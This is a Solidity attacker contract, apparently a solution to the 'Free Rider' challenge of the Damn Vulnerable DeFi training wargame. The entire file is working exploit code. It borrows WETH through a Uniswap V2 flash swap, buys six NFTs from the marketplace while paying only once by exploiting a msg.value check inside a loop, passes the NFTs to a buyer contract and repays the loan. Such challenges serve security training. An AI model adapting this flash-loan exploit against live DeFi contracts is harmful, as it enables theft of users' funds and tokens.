pragma solidity >=0.7;

import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../DamnValuableNFT.sol";
import "hardhat/console.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IERC20 {
    function balanceOf(address) external returns(uint256);
}

contract AttackerFreeRider is IUniswapV2Callee, IERC721Receiver {
    address payable weth;
    FreeRiderNFTMarketplace freeRiderNFTMarketplace;
    address freeRiderBuyer;

    constructor(address _weth, address payable _freeRiderNFTMarketplace, address _freeRiderBuyer) {
        weth = payable(_weth);
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(_freeRiderNFTMarketplace);
        freeRiderBuyer =_freeRiderBuyer;
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        attack(amount0, msg.sender);
    }

    function attack(uint256 _amountWeth, address _uniPair) private {
        weth.call(abi.encodeWithSignature("withdraw(uint256)", _amountWeth));
        uint256[] memory ids = new uint256[](6);
        for(uint8 i = 0; i < 6;) {
            ids[i] = i;
            i++;
        }
        freeRiderNFTMarketplace.buyMany{value: 15 ether}(ids);

        for(uint8 i = 0; i < 6;) {
            DamnValuableNFT token = freeRiderNFTMarketplace.token();
            token.safeTransferFrom(address(this), freeRiderBuyer, i);
            ++i;
        }

        uint256 fee = (_amountWeth * 3 / 997) + 1;
        uint256 repay = _amountWeth + fee;

        weth.call{value: repay}(abi.encodeWithSignature("deposit()"));
        uint256 wethBalance = IERC20(weth).balanceOf(address(this));
        weth.call(abi.encodeWithSignature("transfer(address,uint256)", _uniPair, repay));
    }

    function onERC721Received(
        address from,
        address to,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4){
        return IERC721Receiver.onERC721Received.selector; 
    }

    receive() external payable {}

}